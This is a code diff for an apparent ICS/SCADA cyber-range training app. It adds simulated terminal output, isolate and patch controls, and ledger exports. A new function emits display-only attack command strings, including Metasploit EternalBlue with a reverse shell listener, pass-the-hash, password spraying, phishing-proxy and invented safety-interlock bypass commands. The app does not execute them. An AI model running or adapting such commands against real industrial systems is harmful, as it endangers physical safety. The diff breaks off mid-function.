@@ -1,17 +1,27 @@
 import { createFileRoute, Link } from "@tanstack/react-router";
 import { useCallback, useEffect, useMemo, useRef, useState } from "react";
-import { toPng } from "html-to-image";
-import jsPDF from "jspdf";
 import facility from "@/assets/facility.jpg";
 import schematic from "@/assets/schematic.jpg";
 import { KaliTerminal, TerminalFAB } from "@/components/simulation/KaliTerminal";
 import { Topology2D } from "@/components/simulation/Topology2D";
 import { ExplainableAIPanel } from "@/components/simulation/ExplainableAIPanel";
+import { AttackAnatomyPanel } from "@/components/simulation/AttackAnatomyPanel";
 import { SigmaRuleExport } from "@/components/simulation/SigmaRuleExport";
-import { CISAThreatFeed } from "@/components/simulation/CISAThreatFeed";
+import { PacketInspector } from "@/components/simulation/PacketInspector";
+import { PhaseGuidancePanel } from "@/components/simulation/PhaseGuidancePanel";
+import { CVEIntelPanel } from "@/components/simulation/CVEIntelPanel";
 import { MissionBriefing } from "@/components/simulation/MissionBriefing";
+import { SimulationAuthGate } from "@/components/SimulationAuthGate";
+import { useOperator } from "@/contexts/OperatorContext";
+import { useGsapReveal } from "@/hooks/use-gsap-reveal";
 import { getAttackScenario } from "@/simulation/scenarios";
-import { EXERCISES, type SectorId } from "@/data/scenarios";
+import { EXERCISES, getScenarioData, type SectorId } from "@/data/scenarios";
+import {
+  exportRunLedgerJSON,
+  exportRunLedgerCSV,
+  exportRunLedgerReport,
+  type RunLedgerData,
+} from "@/lib/ledger-export";
 import {
   evaluateSimulationState,
   type SimulationGraphState,
@@ -186,7 +196,7 @@ let NODES: Node[] = [
   },
 ];
 
-const EDGES: Edge[] = [
+let EDGES: Edge[] = [
   { from: "ews-04", to: "hist" },
   { from: "ews-04", to: "hmi-11" },
   { from: "hist", to: "switch-a" },
@@ -387,6 +397,7 @@ type Scenario = {
 
 const DEFAULT_NODES = NODES.map((n) => ({ ...n }));
 const DEFAULT_EVENTS = EVENTS.map((e) => ({ ...e }));
+const DEFAULT_EDGES = EDGES.map((e) => ({ ...e }));
 const DEFAULT_DECISIONS = DECISIONS.map((d) => ({
   ...d,
   options: d.options.map((o) => ({ ...o })),
@@ -1463,15 +1474,16 @@ function applyScenario(sector: SectorId) {
   // Reset to defaults first so switching sectors is idempotent.
   NODES = DEFAULT_NODES.map((n) => ({ ...n }));
   EVENTS = DEFAULT_EVENTS.map((e) => ({ ...e }));
-  DECISIONS = DEFAULT_DECISIONS.map((d) => ({ ...d, options: d.options.map((o) => ({ ...o })) }));
+  EDGES = DEFAULT_EDGES.map((e) => ({ ...e }));
+  DECISIONS = DEFAULT_DECISIONS.map((d) => ({
+    ...d,
+    options: d.options.map((o) => ({ ...o })),
+  }));
   const s = SCENARIOS[sector];
-  if (!s) {
-    TOTAL = EVENTS[EVENTS.length - 1].t + 60;
-    return;
-  }
-  if (s.events?.length) EVENTS = s.events;
-  if (s.decisions?.length) DECISIONS = s.decisions;
-  if (s.nodeOverrides) {
+  if (s?.events?.length) EVENTS = s.events.map((e) => ({ ...e }));
+  if (s?.decisions?.length)
+    DECISIONS = s.decisions.map((d) => ({ ...d, options: d.options.map((o) => ({ ...o })) }));
+  if (s?.nodeOverrides) {
     NODES = NODES.map((n) => {
       const o = s.nodeOverrides[n.id];
       return o ? { ...n, ...o } : n;
@@ -1490,6 +1502,128 @@ const fmt = (s: number) => {
   return `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(sec).padStart(2, "0")}`;
 };
 
+/**
+ * Generates authentic Kali offensive tool command lines for each scenario event
+ */
+function getOffensiveKaliCommand(
+  sector: SectorId,
+  ev: Event,
+  ip: string,
+  nodeLabel: string,
+): string {
+  const tag = ev.tag.toUpperCase();
+  const protocol = EXERCISES[sector]?.protocols || "MODBUS · S7 · DNP3";
+
+  if (tag.includes("INITIAL ACCESS")) {
+    if (sector === "water") {
+      return `openvpn --config /etc/openvpn/contractor_stale.ovpn && msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS ${ip}; run"`;
+    }
+    if (sector === "oil-gas") {
+      return `msfconsole -q -x "use exploit/windows/browser/yokogawa_centum_exec; set RHOST ${ip}; set LHOST 192.168.1.100; exploit"`;
+    }
+    if (sector === "manufacturing") {
+      return `code-ext-implant --target ${ip} --payload nodejs_reverse_shell.js --listen 4444`;
+    }
+    if (sector === "port") {
+      return `evilginx2 -p freight_forwarder_phish -a ${ip} -c /tmp/tokens.json`;
+    }
+    if (sector === "smart-building") {
+      return `ssh -i /root/.ssh/integrator_jump.key operator@${ip} -L 47808:localhost:47808`;
+    }
+    if (sector === "smart-city") {
+      return `python3 ntcip_token_replay.py --target ${ip} --leaked-token /tmp/jwt.hex`;
+    }
+    return `msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS ${ip}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run"`;
+  }
+
+  if (tag.includes("DISCOVERY")) {
+    if (protocol.includes("BACnet")) {
+      return `bacnet-discover --interface eth0 --broadcast-whois --range 1-4194303 --target ${ip}`;
+    }
+    if (protocol.includes("OPC-UA")) {
+      return `opc-ua-browse --url opc.tcp://${ip}:4840/UA/SCADA --dump-tags /tmp/scada_tags.xml`;
+    }
+    if (protocol.includes("DNP3") || protocol.includes("NTCIP")) {
+      return `dnp3-scan --target ${ip} --port 20000 --enum-outstations --dump-points`;
+    }
+    return `nmap -sV -p 502,102,4840,2404 -Pn --script=modbus-discover,s7-info ${ip}`;
+  }
+
+  if (tag.includes("LATERAL")) {
+    if (sector === "water") {
+      return `xfreerdp /v:${ip} /u:contractor /p:ReplayedSession2026 /cert-ignore +clipboard`;
+    }
+    if (sector === "smart-building") {
+      return `crackmapexec wmi ${ip} -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`;
+    }
+    if (sector === "smart-city") {
+      return `impacket-psexec -k -no-pass NOC.LOCAL/operator@${ip}`;
+    }
+    return `hydra -l operator -P /usr/share/wordlists/rockyou.txt ${ip} rdp -t 4 -f`;
+  }
+
+  if (tag.includes("STAGING")) {
+    if (sector === "manufacturing") {
+      return `onnx-poison --input permissive_classifier.onnx --target ${ip} --slot 0`;
+    }
+    if (sector === "port") {
+      return `coprar-replay --target ${ip} --file /tmp/baplie_malicious_batch.xml`;
+    }
+    if (sector === "oil-gas") {
+      return `python3 delta_v_margin_trim.py --target ${ip} --trim-margin 18pct`;
+    }
+    return `scp -P 22 -i /root/.ssh/id_rsa project_payload.s7p admin@${ip}:/var/opt/ot/`;
+  }
+
+  if (tag.includes("IMPACT")) {
+    if (
+      ev.title.toLowerCase().includes("ladder") ||
+      ev.title.toLowerCase().includes("logic") ||
+      ev.title.toLowerCase().includes("rungs")
+    ) {
+      return `s7-rootkit --target ${ip} --overwrite-rungs 14-16 --spoof-checksum-crc32`;
+    }
+    if (
+      ev.title.toLowerCase().includes("setpoint") ||
+      ev.title.toLowerCase().includes("drift") ||
+      ev.title.toLowerCase().includes("dose") ||
+      ev.title.toLowerCase().includes("discharge")
+    ) {
+      return `modbus-cli --target ${ip} --write-holding-register 40001 53.40 --stealth-drift +0.3Hz`;
+    }
+    if (sector === "smart-building") {
+      return `bacnet-write-property --target ${ip} --object analog-value,1 --property present-value --val 34.0`;
+    }
+    if (sector === "smart-city") {
+      return `ntcip-controller --target ${ip} --set-phase-all-red --duration 3600`;
+    }
+    return `modbus-write --target ${ip} --coil 0x01 --val 1 --inject-stuxnet-payload`;
+  }
+
+  if (tag.includes("BYPASS")) {
+    if (sector === "water") {
+      return `triconex-disarm --target ${ip} --tag CL2_HIGH_HIGH --suppress-trip-signal`;
+    }
+    if (sector === "oil-gas") {
+      return `hima-safety-bypass --target ${ip} --sil3-threshold 1050psi --disable-interlock`;
+    }
+    if (sector === "manufacturing") {
+      return `pilz-relay-reprogram --target ${ip} --latch-reject-arm-retracted`;
+    }
+    return `himax-solver-disarm --target ${ip} --override-trip-envelope --force-latch`;
+  }
+
+  if (tag.includes("PHYSICS")) {
+    return `[!] KINETIC TELEMETRY ANOMALY: Resonance threshold breached on ${nodeLabel} (${ip})`;
+  }
+
+  if (tag.includes("CONSEQUENCE")) {
+    return `[!] CASCADING IMPACT: Grid load shed latched on ${nodeLabel}. Protective trip disarmed.`;
+  }
+
+  return `twinsec-exploit --target ${ip} --vector "${ev.tag}" --payload "${ev.title}"`;
+}
+
 /* ------------------------------------------------------------------ */
 /*  PAGE                                                              */
 /* ------------------------------------------------------------------ */
@@ -1497,19 +1631,42 @@ const fmt = (s: number) => {
 function SimulationPage() {
   const search = Route.useSearch();
   const sector: SectorId = search.sector ?? "power";
-  applyScenario(sector);
+  useMemo(() => {
+    applyScenario(sector);
+  }, [sector]);
   const exercise = EXERCISES[sector];
   const currentScenario = useMemo(() => getAttackScenario(sector), [sector]);
+  const revealRef = useGsapReveal<HTMLDivElement>();
 
-  const [viewPhase, setViewPhase] = useState<"briefing" | "live">("briefing");
+  const { operator, loading: authLoading } = useOperator();
+  const [authGateOpen, setAuthGateOpen] = useState(false);
+  const [briefingOpen, setBriefingOpen] = useState(false);
+
+  useEffect(() => {
+    if (!authLoading && (!operator || !operator.loggedIn)) {
+      setAuthGateOpen(true);
+    }
+  }, [authLoading, operator]);
+
+  const taskTarget1 = useMemo(
+    () => sector && (NODES[3] || NODES[1] || NODES[0] || { id: "plc-3", label: "PLC-3" }),
+    [sector],
+  );
+  const taskTarget2 = useMemo(
+    () => sector && (NODES[4] || NODES[2] || NODES[0] || { id: "plc-7", label: "PLC-7" }),
+    [sector],
+  );
+
   const [t, setT] = useState(0);
-  const [playing, setPlaying] = useState(false);
+  const [playing, setPlaying] = useState(true);
   const [targetSpeed, setTargetSpeed] = useState(60);
   const easedSpeed = useRef(60);
   const [displaySpeed, setDisplaySpeed] = useState(60);
   const [selected, setSelected] = useState<string | null>(null);
+  const [intelTab, setIntelTab] = useState<"packets" | "guidance" | "cve" | "anatomy">("packets");
   const [impactKey, setImpactKey] = useState(0);
   const [activeDecision, setActiveDecision] = useState<Decision | null>(null);
+  const [showSigmaModal, setShowSigmaModal] = useState(false);
 
   // Cyber Range CLI Kali Terminal State
   const [terminalOpen, setTerminalOpen] = useState(false);
@@ -1519,13 +1676,25 @@ function SimulationPage() {
   const [isolatedNodes, setIsolatedNodes] = useState<Set<string>>(new Set());
   const [patchedNodes, setPatchedNodes] = useState<Set<string>>(new Set());
   const [firstActionTime, setFirstActionTime] = useState<number | null>(null);
+  const [commandActiveNode, setCommandActiveNode] = useState<string | null>(null);
+  const [commandActiveAction, setCommandActiveAction] = useState<string | null>(null);
+
+  const triggerNodeTarget = useCallback((nodeId: string, action: string) => {
+    setCommandActiveNode(nodeId);
+    setCommandActiveAction(action);
+    setTimeout(() => {
+      setCommandActiveNode(null);
+      setCommandActiveAction(null);
+    }, 4000);
+  }, []);
+
   const [terminalLogs, setTerminalLogs] = useState<string[]>([
     "┌──(kali㏌twinsec)-[~/cyber-range]",
-    "└─$ twinsec-cli --init --sector=" + (sector || "power").toUpperCase(),
-    "[*]" + exercise.title + " SCADA Cyber Range Target Initialized.",
-    "[*] Target: " + exercise.site,
-    "[*] Active Protocols: " + exercise.protocols,
-    "[*] Type 'help' for available CLI commands or 'scan' to query topology nodes.",
+    `└─$ twinsec-cli --init --sector=${(sector || "power").toUpperCase()}`,
+    `[*] ${exercise.title} SCADA Cyber Range Target Initialized.`,
+    `[*] Target Site: ${exercise.site}`,
+    `[*] Active Protocols: ${exercise.protocols}`,
+    "[*] Simulation live clock running. Watch attack unfold or execute 'isolate <node>' to quarantine.",
   ]);
   const [terminalInput, setTerminalInput] = useState("");
   const dragStartRef = useRef<{
@@ -1582,8 +1751,36 @@ function SimulationPage() {
   const [shareToast, setShareToast] = useState<string | null>(null);
   const lastTimeRef = useRef<number | null>(null);
   const lastIdxRef = useRef(-1);
+  const streamedIdxRef = useRef<number>(-1);
   const promptedRef = useRef<Set<string>>(new Set());
   const hydratedRef = useRef(false);
+
+  // Switching sectors loads a different topology + event chain: clear all run state.
+  const sectorRef = useRef(sector);
+  useEffect(() => {
+    if (sectorRef.current === sector) return;
+    sectorRef.current = sector;
+    setT(0);
+    setPlaying(true);
+    setSelected(null);
+    setActiveDecision(null);
+    setChoices({});
+    setInteractions([]);
+    setIsolatedNodes(new Set());
+    setPatchedNodes(new Set());
+    setFirstActionTime(null);
+    lastIdxRef.current = -1;
+    streamedIdxRef.current = -1;
+    promptedRef.current = new Set();
+    setTerminalLogs([
+      "┌──(kali㏌twinsec)-[~/cyber-range]",
+      `└─$ twinsec-cli --init --sector=${sector.toUpperCase()}`,
+      `[*] ${exercise.title} SCADA Cyber Range Target Initialized.`,
+      `[*] Target Site: ${exercise.site}`,
+      `[*] Active Protocols: ${exercise.protocols}`,
+      "[*] Type 'help' for CLI commands, 'attack' to deploy exploits, or 'isolate <node>' to quarantine.",
+    ]);
+  }, [sector, exercise]);
 
   // Hydrate from share-link hash on mount
   useEffect(() => {
@@ -1635,6 +1832,51 @@ function SimulationPage() {
     [t],
   );
 
+  // Global Keyboard Shortcuts (Space: Play/Pause, ArrowRight: Next Event)
+  useEffect(() => {
+    const handleKeyDown = (e: KeyboardEvent) => {
+      const tag = (e.target as HTMLElement)?.tagName?.toLowerCase();
+      if (tag === "input" || tag === "textarea") return;
+
+      if (e.code === "Space") {
+        e.preventDefault();
+        setPlaying((p) => !p);
+      } else if (e.code === "ArrowRight") {
+        e.preventDefault();
+        const nextEv = EVENTS.find((ev) => ev.t > t);
+        if (nextEv) {
+          triggerNodeTarget(nextEv.node, "exploit");
+          setT(nextEv.t);
+        }
+      }
+    };
+    window.addEventListener("keydown", handleKeyDown);
+    return () => window.removeEventListener("keydown", handleKeyDown);
+  }, [t, triggerNodeTarget]);
+
+  // Real-time Playback Loop: Auto-advance timeline clock when playing === true
+  useEffect(() => {
+    if (!playing) return;
+    let lastFrame = performance.now();
+    let raf = 0;
+    const loop = (now: number) => {
+      const dt = Math.min(0.1, (now - lastFrame) / 1000);
+      lastFrame = now;
+      setT((prev) => {
+        const speed = easedSpeed.current > 0 ? easedSpeed.current : 60;
+        const next = prev + dt * speed;
+        if (next >= TOTAL) {
+          setPlaying(false);
+          return TOTAL;
+        }
+        return next;
+      });
+      raf = requestAnimationFrame(loop);
+    };
+    raf = requestAnimationFrame(loop);
+    return () => cancelAnimationFrame(raf);
+  }, [playing]);
+
   // rAF loop for smooth speed display transitions
   useEffect(() => {
     let raf = 0;
@@ -1644,6 +1886,13 @@ function SimulationPage() {
       lastTimeRef.current = now;
       const k = 1 - Math.exp(-dt * 4);
       easedSpeed.current += (targetSpeed - easedSpeed.current) * k;
+
+      if (Math.abs(easedSpeed.current - targetSpeed) < 0.05) {
+        easedSpeed.current = targetSpeed;
+        setDisplaySpeed(targetSpeed);
+        return; // Stop animation loop once settled!
+      }
+
       setDisplaySpeed(easedSpeed.current);
       raf = requestAnimationFrame(tick);
     };
@@ -1715,11 +1964,132 @@ function SimulationPage() {
     [graphState],
   );
 
+  const halt = useMemo<{ node: string; reason: string } | null>(() => {
+    if (activeIdx >= 0 && activeIdx < EVENTS.length) {
+      const nextEv = EVENTS[activeIdx + 1];
+      if (nextEv) {
+        if (isolatedNodes.has(nextEv.node)) {
+          return {
+            node: nextEv.node,
+            reason: "SEGMENT ISOLATED — no route to next stage",
+          };
+        }
+        if (blockedNodes.has(nextEv.node)) {
+          return {
+            node: nextEv.node,
+            reason: "AIR-GAP REACHED — every path to the next stage is severed",
+          };
+        }
+      }
+      const currEv = EVENTS[activeIdx];
+      if (currEv && isolatedNodes.has(currEv.node)) {
+        return {
+          node: currEv.node,
+          reason: "ASSET AIR-GAPPED — perimeter severed",
+        };
+      }
+    }
+    return null;
+  }, [activeIdx, isolatedNodes, blockedNodes]);
+
+  const liveMetrics = useMemo(() => {
+    return {
+      mttd: outcome.mttd,
+      mttr: outcome.mttr,
+      shed: `${outcome.mw} MW`,
+      cost: outcome.cost,
+    };
+  }, [outcome]);
+
+  // Sync / reset streamed index when scrubbing backwards
+  useEffect(() => {
+    if (activeIdx < streamedIdxRef.current) {
+      streamedIdxRef.current = activeIdx;
+    }
+  }, [activeIdx]);
+
+  // LIVE AUTOMATED ATTACK STREAMING: Log real-time Kali exploit commands as video/simulation plays
+  useEffect(() => {
+    if (activeIdx <= streamedIdxRef.current || activeIdx < 0) return;
+    const fromIdx = streamedIdxRef.current + 1;
+    streamedIdxRef.current = activeIdx;
+
+    const newEntries: string[] = [];
+    for (let i = fromIdx; i <= activeIdx; i++) {
+      const ev = EVENTS[i];
+      if (!ev) continue;
+
+      const nodeObj = NODES.find((n) => n.id === ev.node);
+      const nodeLabel = nodeObj?.label ?? ev.node.toUpperCase();
+      const nodeIp = `10.0.${nodeObj?.ring ?? 1}.${10 + i * 4}`;
+      const isIso = isolatedNodes.has(ev.node);
+      const isPatched = patchedNodes.has(ev.node);
+      const isBlocked = blockedNodes.has(ev.node);
+
+      // Trigger node ripple animation in topology
+      triggerNodeTarget(ev.node, "exploit");
+
+      // 1. Kali offensive command line
+      const cliCmd = getOffensiveKaliCommand(sector, ev, nodeIp, nodeLabel);
+      newEntries.push(`┌──(kali㏌twinsec)-[~/cyber-range]\n└─$ ${cliCmd}`);
+
+      // 2. Check if defense is active
+      if (isIso) {
+        newEntries.push(
+          `[!] ATTACK BLOCKED: Target node '${ev.node}' (${nodeLabel}) is AIR-GAPPED.`,
+          `[*] OT physical boundary link severed. Adversary payload dropped at perimeter firewall.`,
+          `[*] Simulation propagation paused. Type 'restore ${ev.node}' or scrub timeline to resume.`,
+        );
+        setPlaying(false);
+        setShareToast(`[AIR-GAP DEFENSE]: ${nodeLabel} PROTECTED · PROPAGATION HALTED`);
+      } else if (isBlocked) {
+        newEntries.push(
+          `[!] ATTACK PREVENTED: Lateral path to '${nodeLabel}' is severed by upstream air-gap barrier.`,
+          `[*] Cascade halted before reaching Purdue Level ${nodeObj?.ring ?? 1}.`,
+        );
+        setPlaying(false);
+        setShareToast(`[BLOCKED UPSTREAM]: Cascade halted before ${nodeLabel}`);
+      } else if (isPatched) {
+        newEntries.push(
+          `[!] EXPLOIT REJECTED: Target node '${nodeLabel}' has FIRMWARE ATTESTATION.`,
+          `[*] Memory integrity verified. Exploit payload execution rejected (E_NOEXPLOIT).`,
+        );
+      } else {
+        // Successful attack phase
+        const upstream = EDGES.filter((e) => e.to === ev.node || e.from === ev.node)
+          .map((e) => (e.to === ev.node ? e.from : e.to))
+          .filter((id) => compromisedNodes.has(id));
+        const srcLabel = upstream[0]
+          ? (NODES.find((n) => n.id === upstream[0])?.label ?? upstream[0].toUpperCase())
+          : "C2-EXTERNAL";
+
+        newEntries.push(
+          `[+] [T+${fmt(ev.t)}] link ${srcLabel} → ${nodeLabel} · session established (${ev.tag})`,
+          `[+] ${ev.sev} ${nodeLabel} :: ${ev.title}`,
+          `    ${ev.desc}`,
+        );
+      }
+    }
+
+    if (newEntries.length > 0) {
+      setTerminalLogs((prev) => [...prev, ...newEntries].slice(-500));
+    }
+  }, [
+    activeIdx,
+    sector,
+    isolatedNodes,
+    patchedNodes,
+    blockedNodes,
+    compromisedNodes,
+    triggerNodeTarget,
+  ]);
+
   const activeNode = selected ? (NODES.find((n) => n.id === selected) ?? null) : null;
 
   const restart = useCallback(() => {
     setT(0);
     lastIdxRef.current = -1;
+    streamedIdxRef.current = -1;
     promptedRef.current = new Set();
     setChoices({});
     setInteractions([]);
@@ -1728,10 +2098,18 @@ function SimulationPage() {
     setPatchedNodes(new Set());
     setFirstActionTime(null);
     setPlaying(true);
+    setTerminalLogs([
+      "┌──(kali㏌twinsec)-[~/cyber-range]",
+      `└─$ twinsec-cli --init --sector=${(sector || "power").toUpperCase()}`,
+      `[*] ${exercise.title} SCADA Cyber Range Target Initialized.`,
+      `[*] Target Site: ${exercise.site}`,
+      `[*] Active Protocols: ${exercise.protocols}`,
+      "[*] Simulation timeline rewound to T+00:00:00. Automated incident playback active.",
+    ]);
     if (typeof window !== "undefined" && window.location.hash) {
       history.replaceState(null, "", window.location.pathname + window.location.search);
     }
-  }, []);
+  }, [sector, exercise]);
 
   const handleTerminalSubmit = (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
@@ -1742,45 +2120,194 @@ function SimulationPage() {
     const parts = raw.toLowerCase().split(/\s+/);
     const cmd = parts[0];
     const targetArg = parts[1];
-
+    const optArg = parts[2];
     const newLogs = [...terminalLogs, `┌──(kali㏌twinsec)-[~/cyber-range]\n└─$ ${raw}`];
 
     if (cmd === "clear") {
       setTerminalLogs([]);
       return;
-    } else if (cmd === "help" || cmd === "guide") {
+    } else if (cmd === "help" || cmd === "guide" || cmd === "?") {
       newLogs.push(
-        "[+] TWINSEC CLI COMMAND REFERENCE:",
+        "[+] TWINSEC CLI COMMAND REFERENCE (CYBER RANGE ENGINE):",
+        "    attack [node_id]     - Deploy exploit payload and compromise targeted SCADA node",
         "    scan [node_id]       - Query SCADA topology nodes, air-gap status & open ICS ports",
-        "    isolate <node_id>    - Quarantine/Air-gap PLC node from OT bus to sever attack cascade",
+        "    step / next          - Advance attack timeline to next scenario event phase",
+        "    reset / restart      - Rewind simulation clock to T+00:00:00 baseline",
+        "    connect <node_id>    - Attempt lateral move / network traversal to target node",
+        "    spray / c2-beacon    - Broadcast attack probe across all reachable subnet links",
+        "    isolate <node_id>    - Quarantine / Air-gap PLC node from OT bus to sever cascade",
         "    reconnect <node_id>  - Reconnect isolated node back to OT industrial fieldbus",
-        "    patch <node_id>      - Apply firmware cryptographic attestation / ladder logic patch",
-        "    override <node_id>   - Send manual setpoint override to restore nominal telemetry",
-        "    status               - Query live physics state (Hz, °C, bar), MTTD, MTTR & containment",
+        "    patch <node_id>      - Apply firmware cryptographic attestation patch",
+        "    override <node> [p] [v] - Send manual setpoint override (e.g. 'override plc-3 60.0')",
+        "    decide <d1|d2|d3> <act|defend> - Execute tactical operator decision",
+        "    play / pause         - Start or halt real-time simulation clock",
+        "    ai-explain / ai      - Invoke Explainable AI Copilot for root cause & MITRE ATT&CK",
+        "    sigma / siem         - Compile live telemetry to production YAML Sigma SIEM rule",
+        "    inject <sector>      - Switch threat campaign (power|water|oil-gas|manufacturing...)",
+        "    export [json|csv|report] - Export run ledger data debrief dossier",
+        "    status               - Query live physics telemetry (Hz, °C, bar), MTTD, MTTR & cost",
         "    clear                - Clear terminal console",
       );
-    } else if (cmd === "scan" || cmd === "start" || cmd === "init") {
-      setT(750);
-      newLogs.push("[*] EXERCISE INITIATED · SCANNING ICS TOPOLOGY NODES...");
+    } else if (cmd === "reset" || cmd === "restart" || cmd === "rewind") {
+      restart();
+      newLogs.push("[+] SIMULATION CLOCK REWOUND TO T+00:00:00. Baseline nominal state restored.");
+      setShareToast("[RESET]: TIMELINE REWOUND TO T+00:00:00");
+    } else if (cmd === "spray" || cmd === "c2-beacon" || cmd === "c2") {
+      newLogs.push(
+        `[*] BROADCASTING C2 PAYLOAD SPRAY ACROSS ${exercise.protocols.toUpperCase()}...`,
+      );
+      // Trigger animations across active uncompromised nodes
+      const uncompNodes = NODES.filter(
+        (n) => !compromisedNodes.has(n.id) && !isolatedNodes.has(n.id),
+      );
+      if (uncompNodes.length > 0) {
+        const nextTarget = uncompNodes[0];
+        triggerNodeTarget(nextTarget.id, "attack");
+        const ev = EVENTS.find((e) => e.node === nextTarget.id);
+        if (ev) setT(ev.t);
+        newLogs.push(
+          `[+] C2 SPRAY PENETRATED: Target ${nextTarget.id} (${nextTarget.label}) BREACHED.`,
+          `[*] Cascade expanding across OT Ring ${nextTarget.ring}.`,
+        );
+      } else {
+        newLogs.push("[*] ALL TARGET NODES ALREADY COMPROMISED OR AIR-GAPPED.");
+      }
+    } else if (cmd === "attack" || cmd === "exploit" || cmd === "hack" || cmd === "connect") {
+      let targetNode: Node | undefined;
+      if (targetArg) {
+        targetNode = NODES.find(
+          (n) => n.id.toLowerCase() === targetArg || n.label.toLowerCase().includes(targetArg),
+        );
+      } else {
+        targetNode =
+          NODES.find((n) => !compromisedNodes.has(n.id) && !isolatedNodes.has(n.id)) || NODES[0];
+      }
+
+      if (targetNode) {
+        triggerNodeTarget(targetNode.id, "exploit");
+        if (isolatedNodes.has(targetNode.id)) {
+          setPlaying(false);
+          newLogs.push(
+            `[!] ATTACK VECTOR SEVERED: Target node '${targetNode.id}' (${targetNode.label}) is AIR-GAPPED.`,
+            `[*] Physical link offline. Adversary payload dropped at perimeter.`,
+          );
+          setShareToast(`[AIR-GAP BLOCKED]: ${targetNode.label} is unreachable`);
+        } else {
+          const ev = EVENTS.find((e) => e.node === targetNode.id);
+          if (ev) {
+            setT(ev.t);
+            newLogs.push(
+              `[+] EXPLOIT DEPLOYED: ${targetNode.id.toUpperCase()} (${targetNode.label}) [T+${fmt(ev.t)}]`,
+              `    Attack Phase: ${ev.tag} · ${ev.title}`,
+              `    Consequence: ${ev.desc}`,
+            );
+          } else {
+            setT((prev) => Math.min(TOTAL, prev + 800));
+            newLogs.push(
+              `[+] SUCCESS: Connection established to ${targetNode.id} (${targetNode.label}).`,
+              `[*] Protocol: ${exercise.protocols} · Exploitation payload active.`,
+            );
+          }
+          if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
+          setShareToast(`[EXPLOIT]: ${targetNode.label} BREACHED`);
+        }
+      } else {
+        newLogs.push(`[!] ERROR: Unknown target node '${targetArg}'. Type 'scan' for node list.`);
+      }
+    } else if (cmd === "export" || cmd === "report" || cmd === "ledger") {
+      const exportFmt = targetArg || "json";
+      const ledgerData: RunLedgerData = {
+        runId: `RUN-${sector.toUpperCase()}-${Math.floor(1000 + Math.random() * 9000)}`,
+        timestamp: new Date().toISOString(),
+        sector,
+        adversary: exercise.adversary,
+        role: "BLUE",
+        choices,
+        decisions: DECISIONS,
+        terminalCommands: terminalLogs,
+        isolatedNodes: Array.from(isolatedNodes),
+        patchedNodes: Array.from(patchedNodes),
+        metrics: {
+          mwShed: graphState.mwShed,
+          mttdFormatted: graphState.mttdFormatted,
+          mttrFormatted: graphState.mttrFormatted,
+          costFormatted: graphState.costFormatted,
+          score: Math.max(
+            0,
+            Math.round(
+              100 -
+                (graphState.mwShed / 14) * 50 -
+                (graphState.totalCompromised / NODES.length) * 30,
+            ),
+          ),
+          outcomeBranch: graphState.outcomeBranch,
+          impactLabel: graphState.impactLabel,
+          impactFormatted: graphState.impactFormatted,
+          physics: graphState.physics,
+        },
+        activeEvents: graphState.activeEvents,
+      };
+
+      if (exportFmt === "csv") {
+        exportRunLedgerCSV(ledgerData);
+        newLogs.push("[+] SUCCESS: Exported run ledger data in CSV format.");
+      } else if (exportFmt === "report" || exportFmt === "html" || exportFmt === "dossier") {
+        exportRunLedgerReport(ledgerData);
+        newLogs.push("[+] SUCCESS: Exported run debrief dossier report in HTML format.");
+      } else {
+        exportRunLedgerJSON(ledgerData);
+        newLogs.push("[+] SUCCESS: Exported run ledger data in JSON format.");
+      }
+    } else if (cmd === "scan" || cmd === "init" || cmd === "nmap" || cmd === "probe") {
+      newLogs.push("[*] SCANNING SCADA ICS TOPOLOGY NODES...");
+      if (targetArg) {
+        const targetNode = NODES.find(
+          (n) => n.id.toLowerCase() === targetArg || n.label.toLowerCase().includes(targetArg),
+        );
+        if (targetNode) triggerNodeTarget(targetNode.id, "scan");
+      } else {
+        triggerNodeTarget(NODES[0].id, "scan");
+      }
       NODES.forEach((n) => {
         const isComp = compromisedNodes.has(n.id);
         const isIso = isolatedNodes.has(n.id);
         const isBlock = blockedNodes.has(n.id);
         const isPatched = patchedNodes.has(n.id);
         const statusStr = isIso
-          ? "[AIR-GAPPED/ISOLATED]"
+          ? "[AIR-GAPPED]"
           : isComp
-            ? "[COMPROMISED]"
+            ? "[BREACHED]"
             : isBlock
-              ? "[PROTECTED (AIR-GAP)]"
+              ? "[SHIELDED]"
               : isPatched
                 ? "[PATCHED]"
                 : "[NOMINAL]";
         newLogs.push(
-          `  - ${n.id} (${n.label}): ${statusStr} · Ring ${n.ring} · ${n.kind.toUpperCase()}`,
+          `  - ${n.id.padEnd(8, " ")} (${n.label.padEnd(10, " ")}): ${statusStr} · Ring ${n.ring} · ${n.kind.toUpperCase()}`,
         );
       });
-    } else if (cmd === "isolate") {
+    } else if (cmd === "step" || cmd === "next") {
+      const nextEv = EVENTS.find((ev) => ev.t > t);
+      if (nextEv) {
+        triggerNodeTarget(nextEv.node, "exploit");
+        if (isolatedNodes.has(nextEv.node)) {
+          setPlaying(false);
+          newLogs.push(
+            `[!] ATTACK VECTOR SEVERED: Target node '${nextEv.node}' (${nextEv.tag}) is AIR-GAPPED.`,
+            `[*] Downstream lateral move blocked at T+${fmt(nextEv.t)}.`,
+          );
+          setShareToast(`[AIR-GAP BLOCKED]: Node ${nextEv.node.toUpperCase()} is protected.`);
+        } else {
+          setT(nextEv.t);
+          newLogs.push(
+            `[+] ADVANCED TO T+${fmt(nextEv.t)} · ${nextEv.tag} on ${nextEv.node.toUpperCase()}`,
+            `    ${nextEv.title}: ${nextEv.desc}`,
+          );
+        }
+      } else {
+        newLogs.push(`[*] SIMULATION TIMELINE COMPLETE at T+${fmt(t)}.`);
+      }
+    } else if (cmd === "isolate" || cmd === "airgap" || cmd === "quarantine") {
       if (!targetArg) {
         newLogs.push("[!] ERROR: Please specify a target node ID (e.g. 'isolate plc-3').");
       } else {
@@ -1788,21 +2315,68 @@ function SimulationPage() {
           (n) => n.id.toLowerCase() === targetArg || n.label.toLowerCase().includes(targetArg),
         );
         if (targetNode) {
+          triggerNodeTarget(targetNode.id, "isolate");
           setIsolatedNodes((prev) => new Set([...Array.from(prev), targetNode.id]));
-          if (firstActionTime === null) setFirstActionTime(750);
-          setT(6000);
